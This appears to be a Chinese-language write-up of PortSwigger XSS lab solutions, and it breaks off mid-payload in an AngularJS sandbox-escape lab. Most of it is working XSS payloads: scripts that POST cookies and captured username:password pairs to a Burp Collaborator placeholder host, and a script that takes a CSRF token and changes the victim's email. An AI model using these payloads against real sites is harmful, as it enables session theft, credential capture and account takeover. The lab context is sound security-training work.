&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;script&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fetch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;https:&#x2F;&#x2F;BURP-COLLABORATOR-SUBDOMAIN&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;method: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;POST&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;mode: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;no-cors&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;body:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;cookie
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;});
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;**POST的方式&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-exploiting-cross-site-scripting-to-capture-passwords&quot;&gt;Lab: Exploiting cross-site scripting to capture passwords&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;username &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;onchange&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;length)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fetch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;https:&#x2F;&#x2F;BURP-COLLABORATOR-SUBDOMAIN&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,{
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;method:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;POST&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;mode: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;no-cors&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;body:&lt;&#x2F;span&gt;&lt;span&gt;username&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+this.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;value
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;});&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;HTML注入🤔以前没看过。不过也确实是一种拿密码的攻击方式。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-exploiting-xss-to-perform-csrf&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;exploiting&quot;&gt;Exploiting XSS&lt;&#x2F;a&gt; to perform CSRF&lt;&#x2F;h2&gt;
&lt;p&gt;利用 XSS 到 CSRF。因为有 csrf token 所以要特别处理&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;script&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;async&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;email &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;gtg@thebearhimself.rest&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;csrf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= await &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fetch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;my-account&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;then&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span&gt;response&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;response&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;();})
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;then&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span&gt;html&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;html&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;match&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;(?&amp;lt;=value\=&amp;quot;)&lt;&#x2F;span&gt;&lt;span&gt;[A-Za-z0-9]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;(?=&amp;quot;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;];});
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fetch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;my-account&#x2F;change-email&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,{
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;    	method: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;POST&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;		mode: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;no-cors&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;    	headers: {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;    		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;Content-Type&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;application&#x2F;x-www-form-urlencoded&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;    	},
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;		body: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;`email=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;${&lt;&#x2F;span&gt;&lt;span&gt;email&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;csrf=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;${&lt;&#x2F;span&gt;&lt;span&gt;csrf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;`
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;	})
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;})();
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;del&gt;tbh 因为console和page的异步差异卡了许久&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;p&gt;题解给的用的是古老的&lt;code&gt;XMLHttpRequest&lt;&#x2F;code&gt;api：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;script&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;req &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;XMLHttpRequest&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;req&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;onload &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;handleResponse&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;req&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;get&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;my-account&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;req&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;();
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;handleResponse&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;() {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;token &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= this.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;responseText&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;match&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;name=&amp;quot;csrf&amp;quot; value=&amp;quot;(&lt;&#x2F;span&gt;&lt;span&gt;\w&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;];
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;changeReq &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;XMLHttpRequest&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;();
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span&gt;changeReq&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;post&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;my-account&#x2F;change-email&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span&gt;changeReq&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;csrf=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;amp;email=test@test.com&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;};
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-with-angularjs-sandbox-escape-without-strings&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; with AngularJS sandbox escape without strings&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;angular&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;module&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;labApp&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, [])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;controller&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;vulnCtrl&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$scope&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;$parse&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;$scope&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;query &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;{};
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;search&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;$scope&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;query[&lt;&#x2F;span&gt;&lt;span&gt;key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;123&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;$scope&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$parse&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;)(&lt;&#x2F;span&gt;&lt;span&gt;$scope&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;query);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;});&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;h1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ng-controller&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;vulnCtrl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;0 search results for {{value}}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;h1&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;$scope 用于规范当前作用域（没搜到 应该是和这个controller相关的&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.angularjs.org&#x2F;api&#x2F;ng&#x2F;service&#x2F;$parse&quot;&gt;$parse&lt;&#x2F;a&gt; 的功能是将 AngularJS 表达式转换为函数。类似 JS 中 function constructor 的感觉&lt;&#x2F;p&gt;
&lt;p&gt;通过原型设置&lt;code&gt;String.charAt&lt;&#x2F;code&gt;破坏沙箱逻辑，然后将数组传递给 orderBy 过滤器。再次使用 toString() 创建字符串和 String 构造函数属性来设置过滤器的参数，再使用&lt;code&gt;fromCharCode&lt;&#x2F;code&gt;方法通过将字符代码转换为字符串&lt;code&gt;x=alert(1)&lt;&#x2F;code&gt;来生成 payload。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;?&lt;&#x2F;span&gt;&lt;span&gt;search&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;toString&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;constructor&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;prototype&lt;&#x2F;span&gt;&lt;span 